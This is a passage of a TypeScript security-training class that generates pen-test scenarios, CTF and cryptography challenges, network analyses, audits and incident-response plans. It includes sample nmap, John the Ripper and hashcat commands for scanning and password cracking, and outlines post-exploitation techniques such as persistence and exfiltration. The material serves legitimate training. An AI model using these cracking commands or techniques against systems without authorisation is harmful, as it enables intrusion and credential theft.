    if (lower.includes('web') || lower.includes('http') || lower.includes('api')) {
      vectors.push('Web application endpoints', 'REST/GraphQL APIs', 'Authentication flows', 'File upload functionality');
    }
    if (lower.includes('network') || lower.includes('server') || lower.includes('host')) {
      vectors.push('Open network ports', 'Exposed services', 'Management interfaces', 'DNS configuration');
    }
    if (lower.includes('user') || lower.includes('employee') || lower.includes('staff')) {
      vectors.push('Phishing and social engineering', 'Credential reuse', 'Insider threat');
    }
    if (lower.includes('cloud') || lower.includes('aws') || lower.includes('azure')) {
      vectors.push('Cloud IAM misconfiguration', 'Public storage buckets', 'Metadata service access', 'Overly permissive security groups');
    }
    if (lower.includes('mobile') || lower.includes('app')) {
      vectors.push('Insecure data storage', 'Certificate pinning bypass', 'IPC vulnerabilities');
    }
    if (vectors.length === 0) {
      vectors.push('Network perimeter', 'Application layer', 'Human factor');
    }

    const riskLevel = vulns.length >= 5 ? 'high' : vulns.length >= 2 ? 'medium' : 'low';
    return { vectors, vulnerabilities: vulns, riskLevel };
  }

  // ── Penetration Testing Training ────────────────────────────────────────

  /** Generate a pen-test scenario for a target. */
  generatePenTestScenario(target: string, difficulty: number = 3): PenTestScenario {
    this.totalTrainingSessions++;
    const d = clamp(difficulty, 1, 5);

    const phases: PenTestPhase[] = [
      {
        name: 'reconnaissance',
        description: 'Gather information about the target without direct interaction',
        techniques: ['OSINT gathering', 'DNS enumeration', 'WHOIS lookup', 'Google dorking', 'Social media profiling'],
        tools: ['theHarvester', 'Maltego', 'Shodan', 'Recon-ng'],
        outputs: ['Target IP ranges', 'Employee email addresses', 'Technology stack', 'Subdomains'],
      },
      {
        name: 'scanning',
        description: 'Actively probe the target to identify live hosts, open ports, and services',
        techniques: ['Port scanning', 'Service enumeration', 'OS fingerprinting', 'Vulnerability scanning'],
        tools: ['nmap', 'Nessus', 'Nikto', 'dirb/gobuster'],
        outputs: ['Open ports list', 'Service versions', 'Potential vulnerabilities', 'Directory listing'],
      },
      {
        name: 'exploitation',
        description: 'Attempt to exploit identified vulnerabilities to gain access',
        techniques: d >= 3
          ? ['Exploit known CVEs', 'Web application attacks', 'Password attacks', 'Social engineering', 'Client-side attacks']
          : ['Exploit known CVEs', 'Default credential testing', 'Web application attacks'],
        tools: ['Metasploit', 'Burp Suite', 'sqlmap', 'John the Ripper', 'Hashcat'],
        outputs: ['Access gained', 'Credentials obtained', 'Shells established'],
      },
      {
        name: 'post-exploitation',
        description: 'Expand access and gather evidence after initial compromise',
        techniques: d >= 3
          ? ['Privilege escalation', 'Lateral movement', 'Persistence mechanisms', 'Data exfiltration', 'Credential harvesting']
          : ['Privilege escalation', 'Local enumeration'],
        tools: ['Mimikatz', 'BloodHound', 'PowerSploit', 'LinPEAS'],
        outputs: ['Escalated privileges', 'Network map', 'Sensitive data samples', 'Persistence established'],
      },
      {
        name: 'reporting',
        description: 'Document findings with evidence, risk ratings, and remediation guidance',
        techniques: ['Risk-based finding prioritization', 'Executive summary writing', 'Technical detail documentation', 'Remediation roadmap'],
        tools: ['Report templates', 'Screenshots and logs', 'Risk scoring matrices'],
        outputs: ['Executive summary', 'Technical findings report', 'Remediation plan', 'Retest recommendations'],
      },
    ];

    const allTools = [...new Set(phases.flatMap(p => p.tools))];

    return {
      name: `Penetration Test: ${target}`,
      target,
      methodology: this.config.penTestMethodology.toUpperCase(),
      phases,
      tools: allTools,
      objectives: [
        'Identify exploitable vulnerabilities',
        'Demonstrate impact of successful exploitation',
        'Assess effectiveness of existing security controls',
        'Provide actionable remediation recommendations',
      ],
      difficulty: d,
    };
  }

  /** Retrieve knowledge about a specific pen-test tool. */
  getToolKnowledge(toolName: string): { name: string; category: string; description: string; commonUsage: string[]; relatedTools: string[] } {
    const tools: Record<string, { category: string; description: string; commonUsage: string[]; relatedTools: string[] }> = {
      nmap: {
        category: 'scanning',
        description: 'Network exploration and security auditing tool for port scanning and service detection',
        commonUsage: ['nmap -sV -sC target (service/version + default scripts)', 'nmap -p- target (all ports)', 'nmap -sU target (UDP scan)', 'nmap --script vuln target (vulnerability scripts)'],
        relatedTools: ['masscan', 'Nessus', 'Zenmap'],
      },
      burpsuite: {
        category: 'web-testing',
        description: 'Integrated platform for web application security testing with proxy, scanner, and extensibility',
        commonUsage: ['Intercept and modify HTTP requests', 'Active and passive vulnerability scanning', 'Intruder for fuzzing and brute-forcing', 'Repeater for manual request manipulation'],
        relatedTools: ['OWASP ZAP', 'mitmproxy', 'Fiddler'],
      },
      metasploit: {
        category: 'exploitation',
        description: 'Penetration testing framework with a large database of exploits, payloads, and auxiliary modules',
        commonUsage: ['search + use to find and select exploit modules', 'set RHOSTS/RPORT to configure target', 'run/exploit to execute the module', 'post/ modules for post-exploitation'],
        relatedTools: ['Cobalt Strike', 'Empire', 'Sliver'],
      },
      wireshark: {
        category: 'network-analysis',
        description: 'Network protocol analyser for capturing and inspecting packets at a granular level',
        commonUsage: ['Capture live traffic on an interface', 'Filter with display filters (e.g., http, tcp.port==443)', 'Follow TCP/UDP streams', 'Export objects from HTTP traffic'],
        relatedTools: ['tcpdump', 'tshark', 'NetworkMiner'],
      },
      john: {
        category: 'password-cracking',
        description: 'Password cracking tool supporting many hash types and attack modes',
        commonUsage: ['john --wordlist=rockyou.txt hashes.txt', 'john --rules --wordlist=custom.txt hashes.txt', 'john --show hashes.txt (display cracked)', 'john --format=raw-sha256 hashes.txt'],
        relatedTools: ['Hashcat', 'Hydra', 'Medusa'],
      },
      hashcat: {
        category: 'password-cracking',
        description: 'Advanced GPU-accelerated password recovery tool supporting hundreds of hash types',
        commonUsage: ['hashcat -m 0 -a 0 hashes.txt wordlist.txt (MD5 dictionary)', 'hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a (NTLM brute-force)', 'hashcat --show hashes.txt (display cracked)', 'hashcat -m 2500 capture.hccapx wordlist.txt (WPA)'],
        relatedTools: ['John the Ripper', 'CeWL', 'PACK'],
      },
    };

    const key = toolName.toLowerCase().replace(/\s+/g, '');
    const info = tools[key];
    if (info) {
      return { name: toolName, ...info };
    }

    return {
      name: toolName,
      category: 'unknown',
      description: `No detailed knowledge available for "${toolName}".`,
      commonUsage: [],
      relatedTools: [],
    };
  }

  // ── Network Security ────────────────────────────────────────────────────

  /** Analyze a network description and produce security findings. */
  analyseNetwork(description: string): NetworkAnalysis {
    this.totalTrainingSessions++;
    const lower = description.toLowerCase();
    const openPorts: number[] = [];
    const services: string[] = [];
    const vulnerabilities: string[] = [];
    const recommendations: string[] = [];

    const portMap: Array<[RegExp, number, string]> = [
      [/\bhttp\b|port\s*80\b|web\s*server/i, 80, 'HTTP'],
      [/\bhttps\b|port\s*443\b|ssl|tls/i, 443, 'HTTPS'],
      [/\bssh\b|port\s*22\b/i, 22, 'SSH'],
      [/\bftp\b|port\s*21\b/i, 21, 'FTP'],
      [/\bsmtp\b|port\s*25\b|mail/i, 25, 'SMTP'],
      [/\bdns\b|port\s*53\b/i, 53, 'DNS'],
      [/\brdp\b|port\s*3389\b|remote\s*desktop/i, 3389, 'RDP'],
      [/\bsmb\b|port\s*445\b/i, 445, 'SMB'],
      [/\bmysql\b|port\s*3306\b/i, 3306, 'MySQL'],
      [/\bpostgres\b|port\s*5432\b/i, 5432, 'PostgreSQL'],
      [/\bredis\b|port\s*6379\b/i, 6379, 'Redis'],
      [/\bmongodb?\b|port\s*27017\b/i, 27017, 'MongoDB'],
    ];

    for (const [pat, port, svc] of portMap) {
      if (pat.test(lower)) {
        openPorts.push(port);
        services.push(svc);
      }
    }

    if (openPorts.includes(21)) {
      vulnerabilities.push('FTP transmits credentials in cleartext');
      recommendations.push('Replace FTP with SFTP or SCP');
    }
    if (openPorts.includes(25)) {
      vulnerabilities.push('SMTP may allow open relay or lack TLS');
      recommendations.push('Enable STARTTLS and configure SPF/DKIM/DMARC');
    }
    if (openPorts.includes(3389)) {
      vulnerabilities.push('RDP exposed to the internet is a common attack vector');
      recommendations.push('Restrict RDP access via VPN or jump box; enable NLA');
    }
    if (openPorts.includes(6379)) {
      vulnerabilities.push('Redis without authentication allows unauthenticated access');
      recommendations.push('Enable Redis AUTH and bind to localhost or private network');
    }
    if (openPorts.includes(27017)) {
      vulnerabilities.push('MongoDB may lack authentication if exposed publicly');
      recommendations.push('Enable authentication and restrict network access');
    }
    if (openPorts.includes(445)) {
      vulnerabilities.push('SMB may be vulnerable to EternalBlue or relay attacks');
      recommendations.push('Disable SMBv1; require SMB signing; restrict access');
    }

    if (lower.includes('flat') || lower.includes('no segmentation')) {
      vulnerabilities.push('Flat network allows unrestricted lateral movement');
      recommendations.push('Implement network segmentation with VLANs and firewall rules');
    }
    if (!lower.includes('firewall') && !lower.includes('filtered')) {
      recommendations.push('Deploy a host-based and network firewall');
    }
    if (!lower.includes('ids') && !lower.includes('ips') && !lower.includes('detection')) {
      recommendations.push('Deploy IDS/IPS for network traffic monitoring');
    }

    const topology = lower.includes('dmz') ? 'DMZ architecture'
      : lower.includes('cloud') ? 'Cloud VPC'
      : lower.includes('internal') ? 'Internal network'
      : 'Unknown topology';

    return { topology, openPorts, services, vulnerabilities, recommendations };
  }

  // ── Web Application Security ────────────────────────────────────────────

  /** Get web vulnerability patterns matching a description. */
  getWebVulnerabilities(description: string): WebVulnerability[] {
    this.totalVulnAnalyses++;
    const results: Array<{ vuln: WebVulnerability; score: number }> = [];

    for (const wv of this.webVulnPatterns) {
      const typeSim = tokenSimilarity(description, wv.type);
      const descSim = tokenSimilarity(description, wv.description);
      const score = Math.max(typeSim, descSim);
      if (score >= 0.2) {
        results.push({ vuln: wv, score });
      }
    }

    results.sort((a, b) => b.score - a.score);
    return results.map(r => r.vuln);
  }

  /** Get detection patterns and remediation for a specific web vulnerability type. */
  getWebVulnDetail(type: WebVulnerability['type']): WebVulnerability | null {
    return this.webVulnPatterns.find(wv => wv.type === type) ?? null;
  }

  // ── Cryptography Training ───────────────────────────────────────────────

  /** Generate a cryptography training challenge. */
  generateCryptoChallenge(difficulty: number = 2): CryptoChallenge {
    this.totalChallengesGenerated++;
    const d = clamp(difficulty, 1, 5);

    const challenges: CryptoChallenge[] = [
      {
        algorithm: 'Caesar Cipher', difficulty: 1,
        description: 'Decrypt a message encrypted with a simple shift cipher',
        hint: 'Try all 25 possible shifts and look for readable English',
        concept: 'Substitution ciphers are vulnerable to frequency analysis and brute force',
        commonMistakes: ['Assuming Caesar cipher is secure', 'Forgetting to handle wrapping at Z'],
      },
      {
        algorithm: 'AES-ECB', difficulty: 2,
        description: 'Identify the weakness when AES is used in ECB mode',
        hint: 'Encrypt the same plaintext block twice and compare ciphertext blocks',
        concept: 'ECB mode encrypts identical blocks to identical ciphertext, leaking patterns',
        commonMistakes: ['Using ECB for structured data', 'Not recognising repeated ciphertext blocks'],
      },
      {
        algorithm: 'RSA', difficulty: 3,
        description: 'Exploit a weak RSA key with a small public exponent and no padding',
        hint: 'If e=3 and the message is short, the ciphertext may not wrap around n',
        concept: 'Small exponent RSA without padding allows cube-root attacks',
        commonMistakes: ['Using small exponents without OAEP padding', 'Generating primes that are too close together'],
      },
      {
        algorithm: 'Hash Functions', difficulty: 2,
        description: 'Demonstrate why MD5 is unsuitable for security-critical applications',
        hint: 'Research MD5 collision attacks — identical hashes for different inputs',
        concept: 'Collision resistance is essential for digital signatures and integrity verification',
        commonMistakes: ['Using MD5 for password hashing', 'Confusing preimage resistance with collision resistance'],
      },
      {
        algorithm: 'Diffie-Hellman', difficulty: 3,
        description: 'Perform a man-in-the-middle attack on unauthenticated Diffie-Hellman key exchange',
        hint: 'Without authentication, an attacker can establish separate keys with each party',
        concept: 'Key exchange must be authenticated to prevent MITM attacks',
        commonMistakes: ['Using DH without authentication', 'Using weak group parameters'],
      },
      {
        algorithm: 'Digital Signatures', difficulty: 4,
        description: 'Exploit ECDSA nonce reuse to recover the private signing key',
        hint: 'If two signatures use the same nonce k, the private key can be computed algebraically',
        concept: 'Nonce uniqueness is critical for ECDSA security; reuse is catastrophic',
        commonMistakes: ['Reusing or generating predictable nonces', 'Not using RFC 6979 deterministic nonces'],
      },
      {
        algorithm: 'Symmetric Key Management', difficulty: 4,
        description: 'Identify key management failures in a given application architecture',
        hint: 'Check for hardcoded keys, weak key derivation, and insecure key storage',
        concept: 'Encryption is only as strong as its key management practices',
        commonMistakes: ['Hardcoding keys in source code', 'Using password directly as key without KDF', 'Storing keys alongside encrypted data'],
      },
    ];

    const eligible = challenges.filter(c => c.difficulty <= d + 1);
    return eligible.length > 0
      ? eligible[Math.floor(Math.random() * eligible.length)]
      : challenges[0];
  }

  // ── Social Engineering Awareness ────────────────────────────────────────

  /** Get social engineering awareness scenarios, optionally filtered by type. */
  getSocialEngineeringScenarios(type?: SocialEngineering['type']): SocialEngineering[] {
    this.totalTrainingSessions++;
    if (type) {
      return this.socialEngDB.filter(s => s.type === type);
    }
    return [...this.socialEngDB];
  }

  // ── CTF Challenge Generation ────────────────────────────────────────────

  /** Generate CTF challenges filtered by category and/or difficulty. */
  generateCTFChallenges(
    category?: CTFChallenge['category'],
    maxDifficulty: number = 5,
    count: number = 5,
  ): CTFChallenge[] {
    this.totalChallengesGenerated++;
    const limit = Math.min(count, this.config.maxChallenges);
    let pool = [...this.ctfChallenges];

    if (category) {
      pool = pool.filter(c => c.category === category);
    }
    pool = pool.filter(c => c.difficulty <= maxDifficulty);

    if (!this.config.enableHints) {
      pool = pool.map(c => ({ ...c, hints: [] }));
    }

    return pickItems(pool, limit);
  }

  /** Submit a flag answer for a CTF challenge and check correctness. */
  submitCTFFlag(challengeId: string, submittedFlag: string): { correct: boolean; message: string } {
    const challenge = this.ctfChallenges.find(c => c.id === challengeId);
    if (!challenge) {
      return { correct: false, message: `Challenge "${challengeId}" not found.` };
    }

    const correct = submittedFlag.trim() === challenge.flag;
    if (correct) {
      this.challengesCompleted++;
      this.scoreHistory.push(challenge.points * this.config.scoringWeight);
    }

    return {
      correct,
      message: correct
        ? `Correct! You earned ${challenge.points} points.`
        : 'Incorrect flag. Try again or use a hint.',
    };
  }

  // ── Exploit Technique Knowledge ─────────────────────────────────────────

  /** Look up exploit techniques by name or category. */
  getExploitTechniques(query: string): ExploitTechnique[] {
    const results: Array<{ tech: ExploitTechnique; score: number }> = [];

    for (const tech of this.exploitDB) {
      const nameSim = tokenSimilarity(query, tech.name);
      const catSim = tokenSimilarity(query, tech.category);
      const descSim = tokenSimilarity(query, tech.description);
      const score = Math.max(nameSim, catSim * 0.9, descSim * 0.8);
      if (score >= 0.2) {
        results.push({ tech, score });
      }
    }

    results.sort((a, b) => b.score - a.score);
    return results.map(r => r.tech);
  }

  // ── Security Audit ──────────────────────────────────────────────────────

  /** Perform a security audit based on a target description. */
  performAudit(target: string): SecurityAudit {
    this.totalAudits++;
    const vulns = this.analyseVulnerability(target);
    const network = this.analyseNetwork(target);
    const findings: AuditFinding[] = [];
    let findingCounter = 0;

    for (const vuln of vulns.slice(0, this.config.maxAuditFindings)) {
      findings.push({
        id: `FIND-${++findingCounter}`,
        title: vuln.name,
        severity: vuln.severity,
        category: vuln.category,
        description: vuln.description,
        evidence: `Matched pattern: ${vuln.cweId}`,
        remediation: vuln.remediation,
        effort: vuln.severity === 'critical' || vuln.severity === 'high' ? 'high' : 'medium',
      });
    }

    for (const v of network.vulnerabilities) {
      findings.push({
        id: `FIND-${++findingCounter}`,
        title: v,
        severity: 'medium',
        category: 'network',
        description: v,
        evidence: 'Detected from network description analysis',
        remediation: network.recommendations[network.vulnerabilities.indexOf(v)] ?? 'Apply network hardening',
        effort: 'medium',
      });
    }

    const riskScore = findings.length > 0
      ? round2(findings.reduce((sum, f) => sum + severityToScore(f.severity), 0) / findings.length)
      : 0;

    const complianceStatus = riskScore >= 7 ? 'Non-compliant — critical issues'
      : riskScore >= 4 ? 'Partially compliant — improvements needed'
      : 'Generally compliant — minor issues';

    return {
      target,
      findings,
      riskScore,
      complianceStatus,
      recommendations: [
        ...network.recommendations,
        ...vulns.slice(0, 5).map(v => v.remediation),
      ],
      frameworks: ['OWASP Top 10', 'NIST CSF', 'CIS Controls'],
    };
  }

  // ── Incident Response Training ──────────────────────────────────────────

  /** Generate an incident response plan for a given incident type. */
  generateIncidentResponse(incidentType: string): IncidentResponse[] {
    this.totalTrainingSessions++;
    const lower = incidentType.toLowerCase();

    const isMalware = lower.includes('malware') || lower.includes('ransomware') || lower.includes('virus');
    const isBreach = lower.includes('breach') || lower.includes('data') || lower.includes('exfiltration');
    const isDDoS = lower.includes('ddos') || lower.includes('denial');
    const isPhishing = lower.includes('phishing') || lower.includes('email');

    const phases: IncidentResponse[] = [
      {
        phase: 'detection',
        actions: [
          'Analyze alerts from SIEM and IDS/IPS',
          'Correlate indicators of compromise (IOCs)',
          isMalware ? 'Identify malware signatures and behaviour patterns' :
          isBreach ? 'Detect anomalous data access or transfer patterns' :
          isDDoS ? 'Monitor traffic volume and connection patterns' :
          isPhishing ? 'Analyze reported suspicious emails for phishing indicators' :
          'Triage the alert and confirm the incident',
          'Classify incident severity and notify stakeholders',
        ],
        tools: ['SIEM (Splunk, ELK)', 'IDS/IPS alerts', 'EDR telemetry', 'Threat intelligence feeds'],
        timeline: '0-2 hours from initial alert',
        artifacts: ['Alert logs', 'Network captures', 'Initial IOCs', 'Incident ticket'],
      },
      {
        phase: 'containment',
        actions: [
          isMalware ? 'Isolate infected hosts from the network' :
          isBreach ? 'Revoke compromised credentials and tokens' :
          isDDoS ? 'Enable DDoS mitigation (rate limiting, geo-blocking, scrubbing)' :
          isPhishing ? 'Block sender domain and quarantine similar messages' :
          'Isolate affected systems',
          'Preserve forensic evidence before making changes',
          'Implement short-term containment measures',
          'Establish communication channels for the incident team',
        ],
        tools: ['EDR isolation capabilities', 'Firewall rules', 'IAM console', 'Network ACLs'],
        timeline: '2-8 hours',
        artifacts: ['Containment actions log', 'Memory dumps', 'Disk images', 'Network flow data'],
      },
      {
        phase: 'eradication',
        actions: [
          isMalware ? 'Remove malware and persistence mechanisms from all hosts' :
          isBreach ? 'Close the attack vector; patch exploited vulnerabilities' :
          isDDoS ? 'Identify and block attack sources; harden infrastructure' :
          isPhishing ? 'Remove malicious emails from all mailboxes; reset compromised accounts' :
          'Remove the root cause of the incident',
          'Scan for remaining indicators of compromise',
          'Verify eradication is complete across all affected systems',
        ],
        tools: ['Anti-malware tools', 'Vulnerability scanners', 'Configuration management', 'Patch management'],
        timeline: '8-48 hours',
        artifacts: ['Malware samples', 'Patching records', 'Scan results', 'Remediation evidence'],
      },
      {
        phase: 'recovery',
        actions: [
          'Restore systems from verified clean backups',
          'Gradually return systems to production with enhanced monitoring',
          'Validate system integrity before full restoration',
          'Monitor for signs of re-compromise',
        ],
        tools: ['Backup restoration tools', 'Configuration management', 'Enhanced monitoring', 'Integrity verification'],
        timeline: '48-168 hours',
        artifacts: ['Recovery verification logs', 'System integrity reports', 'Enhanced monitoring baselines'],
      },
      {
        phase: 'lessons',
        actions: [
          'Conduct a blameless post-mortem review',
          'Document the full incident timeline',
          'Identify gaps in detection, prevention, and response',
          'Update runbooks, playbooks, and detection rules',
          'Schedule follow-up remediation tasks',
        ],
        tools: ['Post-mortem templates', 'Issue tracking', 'Knowledge base', 'Training platforms'],
        timeline: '1-2 weeks post-recovery',
        artifacts: ['Post-mortem report', 'Updated playbooks', 'Training materials', 'Remediation tickets'],
      },
    ];

    return phases;
  }

  // ── Skill Assessment ────────────────────────────────────────────────────

  /** Assess security skill level based on self-reported scores by category. */
  assessSkills(scores: Record<string, number>): SecuritySkillAssessment {
    this.totalTrainingSessions++;
    const categories = Object.keys(scores);
    const values = Object.values(scores);

    if (values.length === 0) {
      return {
        overallLevel: 'beginner',
        scores: {},
        gaps: ['No scores provided — start with fundamentals'],
        strengths: [],
        trainingPath: [this.trainingModules[0]?.title ?? 'Introduction to Security'],
      };
    }

    const avg = values.reduce((s, v) => s + v, 0) / values.length;
    const overallLevel: SecuritySkillAssessment['overallLevel'] =
      avg >= 90 ? 'expert' :
      avg >= 70 ? 'advanced' :
      avg >= 50 ? 'intermediate' : 'beginner';

    const gaps: string[] = [];
    const strengths: string[] = [];

    for (const cat of categories) {
      const score = scores[cat];
      if (score < 50) gaps.push(cat);
      else if (score >= 80) strengths.push(cat);
    }

    const trainingPath = this.buildTrainingPath(gaps, overallLevel);

    return { overallLevel, scores: { ...scores }, gaps, strengths, trainingPath };
  }

  /** Retrieve available training modules, optionally filtered. */
  getTrainingModules(category?: string, maxDifficulty?: number): TrainingModule[] {
    let modules = [...this.trainingModules];
    if (category) {
      modules = modules.filter(m => m.category === category);
    }
    if (maxDifficulty !== undefined) {
      modules = modules.filter(m => m.difficulty <= maxDifficulty);
    }
    return modules;
  }

  // ── Feedback ────────────────────────────────────────────────────────────

  /** Provide feedback on a training session or challenge quality. */
  provideFeedback(rating: number, comment: string): void {
    this.feedbackCount++;
    const r = clamp(rating, 1, 5);
    this.scoreHistory.push(r * 20);

    if (comment.toLowerCase().includes('too easy') && this.config.difficultyProgression) {
      this.config.scoringWeight = round2(clamp(this.config.scoringWeight + 0.1, 0.5, 2.0));
    } else if (comment.toLowerCase().includes('too hard') && this.config.difficultyProgression) {
      this.config.scoringWeight = round2(clamp(this.config.scoringWeight - 0.1, 0.5, 2.0));
    }
  }

  // ── Stats ───────────────────────────────────────────────────────────────

  /** Return aggregate statistics. */
  getStats(): Readonly<SecurityTrainerStats> {
    const avg = this.scoreHistory.length > 0
      ? this.scoreHistory.reduce((s, v) => s + v, 0) / this.scoreHistory.length
      : 0;

    return {
      totalTrainingSessions: this.totalTrainingSessions,
      totalChallengesGenerated: this.totalChallengesGenerated,
      totalVulnAnalyses: this.totalVulnAnalyses,
      totalAudits: this.totalAudits,
      challengesCompleted: this.challengesCompleted,
      avgScore: round2(avg),
      feedbackCount: this.feedbackCount,
    };
  }

  // ── Serialization ───────────────────────────────────────────────────────

  /** Serialize the trainer state to JSON. */
  serialize(): string {
    return JSON.stringify({
      config: this.config,
      totalTrainingSessions: this.totalTrainingSessions,
      totalChallengesGenerated: this.totalChallengesGenerated,
      totalVulnAnalyses: this.totalVulnAnalyses,
      totalAudits: this.totalAudits,
      challengesCompleted: this.challengesCompleted,
      scoreHistory: this.scoreHistory,
      feedbackCount: this.feedbackCount,
    });
  }

  /** Restore a SecurityTrainer from serialized JSON. */
  static deserialize(json: string): SecurityTrainer {
    const data = JSON.parse(json) as {
      config: SecurityTrainerConfig;
      totalTrainingSessions: number;
      totalChallengesGenerated: number;
      totalVulnAnalyses: number;
      totalAudits: number;
      challengesCompleted: number;
      scoreHistory: number[];
      feedbackCount: number;
    };

    const instance = new SecurityTrainer(data.config);
    instance.totalTrainingSessions = data.totalTrainingSessions;
    instance.totalChallengesGenerated = data.totalChallengesGenerated;
    instance.totalVulnAnalyses = data.totalVulnAnalyses;
    instance.totalAudits = data.totalAudits;
    instance.challengesCompleted = data.challengesCompleted;
    instance.scoreHistory = data.scoreHistory;
    instance.feedbackCount = data.feedbackCount;
    return instance;
  }

  // ── Private Helpers ─────────────────────────────────────────────────────

  /** Build a personalized training path based on identified gaps. */
  private buildTrainingPath(gaps: string[], level: SecuritySkillAssessment['overallLevel']): string[] {
    const path: string[] = [];
    const maxDifficulty = level === 'beginner' ? 2 : level === 'intermediate' ? 3 : 5;

    for (const gap of gaps) {
      const modules = this.trainingModules.filter(
        m => tokenSimilarity(gap, m.category) >= 0.3 && m.difficulty <= maxDifficulty,
      );
      for (const mod of modules) {
        if (!path.includes(mod.title)) {
          path.push(mod.title);
        }
      }
    }

    if (path.length === 0) {
      const available = this.trainingModules.filter(m => m.difficulty <= maxDifficulty);
      for (const mod of available.slice(0, 3)) {
        path.push(mod.title);
      }
    }

    return path;
  }
}
